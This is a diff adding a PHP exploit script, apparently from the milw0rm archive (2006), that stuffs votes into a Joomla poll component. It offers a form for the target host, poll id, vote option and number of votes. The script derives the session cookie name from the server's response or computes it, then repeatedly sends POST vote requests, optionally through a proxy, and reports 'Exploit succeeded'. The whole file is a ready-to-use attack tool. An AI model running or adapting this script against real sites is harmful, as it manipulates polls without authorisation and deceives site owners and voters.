@@ -1,0 +1,253 @@
+<?php
+#          Joomla [poll component] add unlimited votes            #
+#            Computer Security Researchers Institute              #
+#              works regardless of php.ini settings               #
+#                          by trueend5                            #
+#                     [http://www.KAPDA.ir]                       #
+
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout", 2);
+ob_implicit_flush (1);
+
+echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Joomla [poll component] arbitrary add votes</title>
+</head>
+<body bgcolor="#FFCCFF">
+<p align="center"><font size="4" color="#0000FF">Joomla&nbsp; [poll
+component] arbitrary add votes</font></p>
+<p class="Stile6" align="center"><font size="3" color="#FF0000">by trueend5</font></p>
+<p align="center"><font size="4" color="#008000">Computer Security Researchers
+Institute</font></p>
+<font SIZE="3">
+<p align="center"><b><a href="http://www.kapda.ir"><font color="#000000">KAPDA</font></a>.ir</b></p>
+
+<p align="center">&nbsp;</p>
+</font>
+<table width="90%">
+  <tbody>
+    <tr>
+      <td width="43%" align="left">
+        <form name="form1" action="'.$SERVER[PHP_SELF].'" method="post">
+          <p><input name="host" size="20"> <span class="Stile5"><font color="#FF0000">*</font> hostname (ex: www.sitename.com)</span></p>
+
+          <p><input name="path" size="20"> <span class="Stile5"><font color="#FF0000">*</font> path (ex: /joomla/
+          or just / )</span></p>
+          <p><input name="pollid" size="20"> <span class="Stile5"><font color="#FF0000">
+			*</font> pollid (ex: index.php?option=com_poll&amp;task=results&amp;<b><font size="4">id=14</font></b> )</span></p>
+
+          <p><input name="voteid" size="20"><span class="Stile5"><font color="#FF0000">
+			*</font> voteid ( <b><u>1</u></b> for first option, <b><u>2</u></b>
+			for second one , <b><u>3</u></b> for third and so... )</span></p>
+
+			<p><input name="hits" size="20"><span class="Stile5"><font color="#FF0000">
+			*</font>
+			hits ( number of votes that you want to add ) </span></p>
+          <p><input name="port" size="20"><span class="Stile5">&nbsp;&nbsp;&nbsp; specify a port&nbsp;
+          (default: 80)</span></p>
+          <p><input name="proxy" size="20" ><span class="Stile5">&nbsp;&nbsp;&nbsp; send exploit
+          through an HTTP proxy (ip:port)</span></p>
+
+          <p align="center"> <span class="Stile5"><font color="#FF0000">&nbsp;&nbsp;
+          * </font>fields are required</span></p>
+          <p align="center"><span class="Stile5">-----------------------------------------------------------------------------------------------</span></p>
+
+          <p><input type="submit" value="Start" name="Submit"></p>
+        </form></td></tr></tbody></table></body></html>';
+
+
+function show($headeri)
+{
+$ii=0;
+$ji=0;
+$ki=0;
+$ci=0;
+echo '<table border="0"><tr>';
+while ($ii <= strlen($headeri)-1)
+{
+$datai=dechex(ord($headeri[$ii]));
+if ($ji==16) {
+             $ji=0;
+             $ci++;
+             echo "<td>&nbsp;&nbsp;</td>";
+             for ($li=0; $li<=15; $li++)
+                      { echo "<td>".$headeri[$li+$ki]."</td>";
+			    }
+            $ki=$ki+16;
+            echo "</tr><tr>";
+            }
+if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
+{echo "<td>".$datai."</td> ";}
+$ii++;
+$ji++;
+}
+for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
+                      { echo "<td>&nbsp&nbsp</td>";
+                       }
+
+for ($li=$ci*16; $li<=strlen($headeri); $li++)
+                      { echo "<td>".$headeri[$li]."</td>";
+			    }
+echo "</tr></table>";
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacket() 
+
+{
+  global $proxy, $host, $port, $packet, $html, $proxy_regex;
+  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+  if ($socket < 0) {
+                   echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
+                   }
+	      else
+ 		  {   $c = preg_match($proxy_regex,$proxy);
+              if (!$c) {echo 'Not a valid proxy...';
+                        die;
+                       }
+                    echo "OK.<br>";
+                    echo "Attempting to connect to ".$host." on port ".$port."...<br>";
+                    if ($proxy=='')
+		   {
+		     $result = socket_connect($socket, $host, $port);
+		   }
+		   else
+		   {
+
+		   $parts =explode(':',$proxy);
+                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+		   $result = socket_connect($socket, $parts[0],$parts[1]);
+		   }
+		   if ($result < 0) {
+                                     echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
+                                    }
+	                       else
+		                    {
+                                     echo "OK.<br><br>";
+                                     $html= '';
+                                     socket_write($socket, $packet, strlen($packet));
+                                     echo "Reading response:<br>";
+                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}
+                                     echo nl2br(htmlentities($html));
+                                     echo "Closing socket...";
+                                     socket_close($socket);
+
+				    }
+                  }
+}
+function sendpacketii($packet)
+{
+global $proxy, $host, $port, $html, $proxy_regex;
+if ($proxy=='')
+           {$ock=fsockopen(gethostbyname($host),$port);}
+             else
+           {
+	   $c = preg_match($proxy_regex,$proxy);
+              if (!$c) {echo 'Not a valid proxy...';
+                        die;
+                       }
+	   $parts=explode(':',$proxy);
+	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+	    $ock=fsockopen($parts[0],$parts[1]);
+	    if (!$ock) { echo 'No response from proxy...';
+			die;
+		       }
+	   }
+fputs($ock,$packet);
+if ($proxy=='')
+  {
+
+    $html='';
+    while (!feof($ock))
+      {
+        $html.=fgets($ock);
+      }
+  }
+else
+  {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
+    {
+      $html.=fread($ock,1);
+    }
+  }
+fclose($ock);
+//echo nl2br(htmlentities($html));
+}
+
+  $host=trim($_POST[host]);
+  $path=trim($_POST[path]);
+  $port=intval(trim($_POST[port]));
+  $pollid=intval(trim($_POST[pollid]));
+  $voteid=intval(trim($_POST[voteid]));
+  $hits=intval(trim($_POST[hits]));
+if (($host<>'') and ($path<>'') and ($pollid<>'') and ($voteid<>'') and ($hits<>''))
+{
+  $host=str_replace("\r\n","",$host);
+  $path=str_replace("\r\n","",$path);
+  if ($port=='') {$port=80;}
+  if ($hits=='') {$hits=200;}
+  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+  $livesite=$host;
+  if ($path=='/') {$livepath='';} else $livepath=substr("$path", 0, strlen($path)-1);
+  $sessionpath='http://'.$livesite.$livepath;
+
+  $packet="HEAD ".$p."index.php HTTP/1.1\r\n";
+  $packet.="User-Agent: Shareaza v1.x.x.xx\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  show($packet);
+  sendpacketii($packet);
+  echo nl2br(htmlentities($html));
+
+  //trying to obtain cookiename from HEADER
+  $pattern="([a-z0-9]{32}=)";
+  if(preg_match($pattern, $html, $matches)) {$match=$matches[0];
+  $sessionCookieName=substr("$match", 0, strlen($match)-1);
+  } else
+  //trying to generate cookiename
+  {$sessionCookieName= md5( 'site'.$sessionpath );}
+
+  for ($t = 14; $t < $pollid; $t++) {$voteid=$voteid + 12;}
+  $data="voteid=".$voteid."";
+  $packet="POST ".$p."index.php?option=com_poll&task=vote&id=".$pollid."&".$sessionCookieName."=1 HTTP/1.0\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+  $packet.="Content-Length: ".strlen($data)."\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  $packet.=$data;
+  show($packet);
+  sendpacketii($packet);
+  echo nl2br(htmlentities($html));
+
+  if (!eregi("Location",$html)) {
+  echo "\n\nExploit failed..."; die();
+ }
+                           else {
+  for ($n = 2; $n <= $hits; $n++) {
+  
+  $data="voteid=".$voteid."";
+  $packet="POST ".$p."index.php?option=com_poll&task=vote&id=".$pollid."&".$sessionCookieName."=1 HTTP/1.0\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+  $packet.="Content-Length: ".strlen($data)."\r\n";
+  $packet.="Connection: Close\r\n\r\n";
+  $packet.=$data;
+  sendpacketii($packet);
+
+  if (!eregi("Location",$html)) {
+  echo "\n\nExploit failed..."; die();
+   }
+  echo "<br />".$n.":added.";
+ }
+                            echo "<br /> Exploit succeeded <br />";
+                            echo'<p align="center"><a href="'.$sessionpath.'/index.php?option=com_poll&task=results&id='.$pollid.'"><font color="#0000FF">Results</font></a></p>';
+                            }
+}
+else
+{echo 'Fill in requested fields, optionally specify a proxy';}
+?>
+
+# milw0rm.com [2006-08-19]
